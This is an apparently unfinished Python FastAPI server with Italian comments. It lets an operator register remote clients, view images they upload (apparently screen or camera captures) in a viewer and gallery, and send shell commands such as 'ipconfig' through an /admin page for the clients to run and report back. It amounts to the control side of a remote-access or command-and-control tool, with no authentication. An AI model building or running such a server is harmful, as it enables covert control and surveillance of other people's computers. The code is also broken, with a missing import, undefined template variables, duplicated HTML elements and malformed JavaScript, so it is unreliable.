
from fastapi import FastAPI, UploadFile, File, Form
from fastapi.responses import FileResponse, HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from starlette.requests import Request
import shutil
import os
from collections import defaultdict
import uuid
from typing import Dict

app = FastAPI()

# Static files (to serve the latest image)
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")


# Stato del server
clients_commands: Dict[str, str] = {}
clients_outputs: Dict[str, str] = {}
enable_image_upload = True


@app.post("/upload-image")
async def upload_image(client_id: str = Query(...), file: UploadFile = File(...)):
    content = await file.read()

    client_dir = f"static/{client_id}"
    os.makedirs(client_dir, exist_ok=True)

    with open(f"{client_dir}/latest.jpg", "wb") as f:
        f.write(content)

    return {"status": "ok"}




registered_clients = set()

@app.get("/register")
async def register():
    client_id = str(uuid.uuid4())
    registered_clients.add(client_id)
    return {"client_id": client_id}



@app.get("/viewer/{client_id}", response_class=HTMLResponse)
async def get_viewer(request: Request, client_id: str):
    image_path = f"/static/{client_id}/latest.jpg"
    return f"""
    <html>
    <body style="background:black;">
        <h2 style="color:white;">Viewer - {client_id}</h2>
        <img src="{image_path}" style="width:100%;" />
    </body>
    </html>
    """


@app.get("/gallery", response_class=HTMLResponse)
async def get_gallery(request: Request):
    images = sorted(
        [f for f in os.listdir("static") if f.endswith(".jpg") and f != "latest.jpg"],
        reverse=True
    )
    return templates.TemplateResponse("gallery.html", {"request": request, "images": images})

commands = defaultdict(str)
outputs = defaultdict(str)

@app.post("/set-command")
async def set_command(client_id: str = Query(...), command: str = Form(...)):
    commands[client_id] = command
    return {"status": "ok"}

@app.get("/command")
async def get_command(client_id: str = Query(...)):
    cmd = commands[client_id]
    commands[client_id] = ""
    return cmd

@app.post("/command-result")
async def receive_result(client_id: str = Query(...), output: str = Form(...)):
    outputs[client_id] = output
    return {"status": "received"}

@app.get("/command-result")
async def get_result(client_id: str = Query(...)):
    return {"output": outputs.get(client_id, "")}
# --------------------------
# ✅ INTERFACCIA /admin
# --------------------------
@app.get("/admin", response_class=HTMLResponse)
async def admin_page():
    client_list_html = "".join([f'<option value="{cid}">{cid}</option>' for cid in registered_clients])
    return f"""
    <html>
    <head>
        <title>Remote CMD</title>
        <script>
            async function sendCommand() {{
                const cmd = document.getElementById('command').value;
                const clientId = document.getElementById('client').value;
                await fetch('/set-command?client_id=' + encodeURIComponent(clientId), {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/x-www-form-urlencoded' }},
                    body: 'command=' + encodeURIComponent(cmd)
                }});
                document.getElementById('output').value = "In attesa di risposta...";
                setTimeout(() => fetchOutput(clientId), 5000);
            }}

            async function fetchOutput(clientId) {{
                const res = await fetch('/command-result?client_id=' + encodeURIComponent(clientId));
                const json = await res.json();
                document.getElementById('output').value = json.output || '(nessun output)';
            async function toggleUpload() {{
                const res = await fetch('/toggle-upload');
                location.reload();
            }}
            }}
        </script>
    </head>
    <body style="background:#111; color:#fff; font-family:monospace;">
        <h3>Seleziona client:</h3>
        <select id="client">{client_list_html}</select>
        <br><br>
        <input type="text" id="command" placeholder="Inserisci comando" />
        <button onclick="sendCommand()">Invia</button>
        <textarea id="output" rows="20" cols="80"></textarea>
    
        <label>Client:</label>
        <select id="client">{client_options}</select>
        <input type="text" id="command" placeholder="es: ipconfig" />
        <button onclick="sendCommand()">Invia</button>
        <textarea id="output" rows="10" placeholder="Output..."></textarea>

        <hr/>
        <h3>🖼 Upload immagini: {image_status}</h3>
        <button onclick="toggleUpload()">Abilita / Disabilita</button>
    </body>
    </html>
    """


@app.get("/toggle-upload")
async def toggle_upload():
    global enable_image_upload
    enable_image_upload = not enable_image_upload
    return {"enabled": enable_image_upload}

@app.get("/", response_class=HTMLResponse)
async def root():
    return '<h2>✅ Server attivo. Vai su <a href="/viewer">/viewer</a> o <a href="/gallery">/gallery</a></h2>'
